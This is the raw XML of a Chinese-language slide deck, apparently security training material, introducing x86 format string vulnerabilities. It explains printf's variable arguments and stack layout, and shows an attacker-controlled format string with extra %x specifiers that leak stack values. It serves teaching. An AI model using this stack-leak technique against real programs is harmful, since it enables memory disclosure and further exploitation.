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3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8" name="Shape 3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等线"/>
      </a:defRPr>
    </a:lvl1pPr>
    <a:lvl2pPr indent="228600" latinLnBrk="0">
      <a:defRPr sz="1200">
        <a:latin typeface="+mn-lt"/>
        <a:ea typeface="+mn-ea"/>
        <a:cs typeface="+mn-cs"/>
        <a:sym typeface="等线"/>
      </a:defRPr>
    </a:lvl2pPr>
    <a:lvl3pPr indent="457200" latinLnBrk="0">
      <a:defRPr sz="1200">
        <a:latin typeface="+mn-lt"/>
        <a:ea typeface="+mn-ea"/>
        <a:cs typeface="+mn-cs"/>
        <a:sym typeface="等线"/>
      </a:defRPr>
    </a:lvl3pPr>
    <a:lvl4pPr indent="685800" latinLnBrk="0">
      <a:defRPr sz="1200">
        <a:latin typeface="+mn-lt"/>
        <a:ea typeface="+mn-ea"/>
        <a:cs typeface="+mn-cs"/>
        <a:sym typeface="等线"/>
      </a:defRPr>
    </a:lvl4pPr>
    <a:lvl5pPr indent="914400" latinLnBrk="0">
      <a:defRPr sz="1200">
        <a:latin typeface="+mn-lt"/>
        <a:ea typeface="+mn-ea"/>
        <a:cs typeface="+mn-cs"/>
        <a:sym typeface="等线"/>
      </a:defRPr>
    </a:lvl5pPr>
    <a:lvl6pPr indent="1143000" latinLnBrk="0">
      <a:defRPr sz="1200">
        <a:latin typeface="+mn-lt"/>
        <a:ea typeface="+mn-ea"/>
        <a:cs typeface="+mn-cs"/>
        <a:sym typeface="等线"/>
      </a:defRPr>
    </a:lvl6pPr>
    <a:lvl7pPr indent="1371600" latinLnBrk="0">
      <a:defRPr sz="1200">
        <a:latin typeface="+mn-lt"/>
        <a:ea typeface="+mn-ea"/>
        <a:cs typeface="+mn-cs"/>
        <a:sym typeface="等线"/>
      </a:defRPr>
    </a:lvl7pPr>
    <a:lvl8pPr indent="1600200" latinLnBrk="0">
      <a:defRPr sz="1200">
        <a:latin typeface="+mn-lt"/>
        <a:ea typeface="+mn-ea"/>
        <a:cs typeface="+mn-cs"/>
        <a:sym typeface="等线"/>
      </a:defRPr>
    </a:lvl8pPr>
    <a:lvl9pPr indent="1828800" latinLnBrk="0">
      <a:defRPr sz="1200">
        <a:latin typeface="+mn-lt"/>
        <a:ea typeface="+mn-ea"/>
        <a:cs typeface="+mn-cs"/>
        <a:sym typeface="等线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3" name="Shape 3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test 1 2 3 c30000 1 80482bd bf8bf301 2f 804a000 740484d2 747365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13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13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half" idx="13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93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文本"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title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02" name="正文级别 1…"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="body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标题文本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11" name="正文级别 1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1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0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文本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9" name="正文级别 1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38" name="正文级别 1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标题文本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47" name="正文级别 1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8" name="Text Placeholder 4"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13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14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5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172" name="正文级别 1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73" name="Text Placeholder 3"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13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1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182" name="Picture Placeholder 2"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph type="pic" sz="half" idx="13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83" name="正文级别 1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92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9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标题文本"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title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01" name="正文级别 1…"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="body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0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标题文本"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="1122362"/>
            <a:ext cx="6858000" cy="2387601"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" defTabSz="685800">
              <a:defRPr sz="4500"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>标题文本</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="210" name="正文级别 1…"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="body" sz="quarter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 defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1800"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="0" indent="342900" algn="ctr" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1800"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="0" indent="685800" algn="ctr" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1800"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="0" indent="1028700" algn="ctr" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1800"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="0" indent="1371600" algn="ctr" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1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11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219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 defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="542925" indent="-200025" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="925830" indent="-240030" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1305657" indent="-276957" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1648557" indent="-276957" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="21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0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标题文本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 defTabSz="685800">
              <a:defRPr sz="4500"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>标题文本</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="228" name="正文级别 1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 defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1800"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="0" indent="342900" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1800"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="0" indent="685800" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1800"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="0" indent="1028700" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1800"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="0" indent="1371600" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1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9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237" name="正文级别 1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 marL="171450" indent="-171450" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="542925" indent="-200025" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="925830" indent="-240030" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1305657" indent="-276957" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1648557" indent="-276957" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="21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8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标题文本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246" name="正文级别 1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 defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr b="1" sz="1800"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="0" indent="342900" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr b="1" sz="1800"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="0" indent="685800" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr b="1" sz="1800"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="0" indent="1028700" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr b="1" sz="1800"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="0" indent="1371600" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr b="1" sz="18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47" name="Text Placeholder 4"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13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 defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr b="1" sz="1800"/>
            </a:pPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248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256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 defTabSz="685800">
              <a:defRPr sz="2400"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>标题文本</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="271" name="正文级别 1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 marL="171450" indent="-171450" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2400"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="538842" indent="-195942" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2400"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="914400" indent="-228600" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2400"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1303019" indent="-274319" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2400"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1645920" indent="-274320" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef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72" name="Text Placeholder 3"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13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 defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1200"/>
            </a:pPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="273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标题文本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 defTabSz="685800">
              <a:defRPr sz="2400"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>标题文本</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="281" name="Picture Placeholder 2"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph type="pic" sz="half" idx="13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282" name="正文级别 1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 defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="0" indent="342900" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1200"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="0" indent="685800" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1200"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="0" indent="1028700" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1200"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="0" indent="1371600" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr sz="1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83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29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171450" indent="-171450" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="542925" indent="-200025" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="925830" indent="-240030" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1305657" indent="-276957" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1648557" indent="-276957" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="21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2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标题文本"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title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/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="685800">
              <a:defRPr sz="3300"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>标题文本</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="300" name="正文级别 1…"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="body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/>
          <a:lstStyle>
            <a:lvl1pPr marL="171450" indent="-171450" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="542925" indent="-200025" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="925830" indent="-240030" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1305657" indent="-276957" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="2100"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1648557" indent="-276957" defTabSz="685800">
              <a:spcBef>
                <a:spcPts val="700"/>
              </a:spcBef>
              <a:defRPr sz="21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01" name="幻灯片编号"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8291328" y="6429694"/>
            <a:ext cx="224023" cy="218441"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="9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251368" y="6404294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ln>
            <a:noFill/>
          </a:ln>
          <a:solidFill>
            <a:srgbClr val="FFFFFF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4.xml"/></Relationships>
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格式化字符串漏洞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4800">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>X86</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>平台的又一常见简单漏洞</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="313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格式化字符串漏洞（</a:t>
            </a:r>
            <a:r>
              <a:t>format string</a:t>
            </a:r>
            <a:r>
              <a:t>）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>Printf</a:t>
            </a:r>
            <a:r>
              <a:t>家族的问题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1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B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>首先我们来看看</a:t>
            </a:r>
            <a:r>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>怎么玩的</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="316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printf(</a:t>
            </a:r>
            <a:r>
              <a:t>他家族：</a:t>
            </a:r>
            <a:r>
              <a:t>fprintf</a:t>
            </a:r>
            <a:r>
              <a:t>等等</a:t>
            </a:r>
            <a:r>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:t>是个函数</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>print()</a:t>
            </a:r>
            <a:r>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:t>fprint()</a:t>
            </a:r>
            <a:r>
              <a:t>等</a:t>
            </a:r>
            <a:r>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:t>print()</a:t>
            </a:r>
            <a:r>
              <a:t>系列的函数可以按照一定的格式将数据进行输出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4800">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr b="0"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>举个例子</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="319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printf("My Name is: %s" , “xman")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
          </a:p>
          <a:p>
            <a:pPr/>
          </a:p>
          <a:p>
            <a:pPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>My Name is</a:t>
            </a:r>
            <a:r>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:t>xman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3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0" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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4" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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8" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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2" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3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500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3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1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77823">
              <a:defRPr sz="5184">
                <a:solidFill>
                  <a:srgbClr val="66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>重要</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" sz="6911">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>特性</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="322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3600"/>
            </a:pPr>
            <a:r>
              <a:t>printf()</a:t>
            </a:r>
            <a:r>
              <a:t>函数的参数个数</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>不固定</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="FFFF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr b="1" sz="3600">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr b="1" sz="4400">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:t>函数的参数分成两部分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500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3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0" dur="5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Class="entr" nodeType="after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4" dur="500"/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500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3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2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7200">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:t>printf</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="325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t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(”I am %d years old and I am a %s”,</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="66FF33"/>
                </a:solidFill>
              </a:rPr>
              <a:t>23,”strdent”)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="66FF33"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="2400"/>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr b="1" sz="3600">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>第一个参数的格式化字符的数量决定了后面参数的数量（这里就是两个）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标题 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="268165" y="250825"/>
            <a:ext cx="2404698" cy="5692776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66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Printf</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>的栈操作</a:t>
            </a:r>
            <a:br>
              <a:rPr b="1"/>
            </a:br>
            <a:br>
              <a:rPr b="1"/>
            </a:br>
            <a:r>
              <a:rPr b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>注意</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%s</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>%d</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的区别</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="328" name="内容占位符 3" descr="内容占位符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63609" y="1169376"/>
            <a:ext cx="6542893" cy="585024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77240">
              <a:defRPr sz="3740">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr b="1"/>
              <a:t>如果</a:t>
            </a:r>
            <a:r>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1"/>
              <a:t>的第一个参数，被我控制了</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="331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81000"/>
              </a:lnSpc>
              <a:defRPr sz="2500"/>
            </a:pPr>
            <a:r>
              <a:t>printf(str)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="81000"/>
              </a:lnSpc>
              <a:defRPr sz="2500"/>
            </a:pPr>
            <a:r>
              <a:t>printf(str,1,1,2,……)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="81000"/>
              </a:lnSpc>
              <a:defRPr sz="2500"/>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="81000"/>
              </a:lnSpc>
              <a:defRPr b="1" sz="2500">
                <a:solidFill>
                  <a:srgbClr val="66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>意味着，后面的参数的个数任我定</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="81000"/>
              </a:lnSpc>
              <a:defRPr sz="2500"/>
            </a:pPr>
            <a:r>
              <a:t>printf("%s %d %d %d %x %x %x %x %x %x %x %x\n",buf,a,b,c)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="81000"/>
              </a:lnSpc>
              <a:defRPr sz="2500"/>
            </a:pPr>
            <a:r>
              <a:t>test 1 2 3 c30000 1 80482bd bf8bf301 2f 804a000 740484d2 747365</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="81000"/>
              </a:lnSpc>
              <a:defRPr b="1" sz="2500">
                <a:solidFill>
                  <a:srgbClr val="66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="81000"/>
              </a:lnSpc>
              <a:defRPr b="1" sz="2500">
                <a:solidFill>
                  <a:srgbClr val="66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>读的是什么？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3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标题 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344128" y="276635"/>
            <a:ext cx="3186267" cy="632081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66FF33"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>printf(str,1,2)</a:t>
            </a:r>
            <a:br/>
            <a:br/>
            <a:br/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="336" name="内容占位符 3"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="4955457" y="1150373"/>
          <a:ext cx="4120333" cy="478212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120331"/>
              </a:tblGrid>
              <a:tr h="673191">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:defRPr sz="3200"/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658287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511276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  <a:r>
                        <a:t>管他是什么无所谓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ebp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ret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arg1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pSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="339" name="右箭头 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3598605" y="4768644"/>
            <a:ext cx="1356853" cy="678427"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="1356851" cy="678425"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="337" name="箭头"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="1356852" cy="678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>
              <a:solidFill>
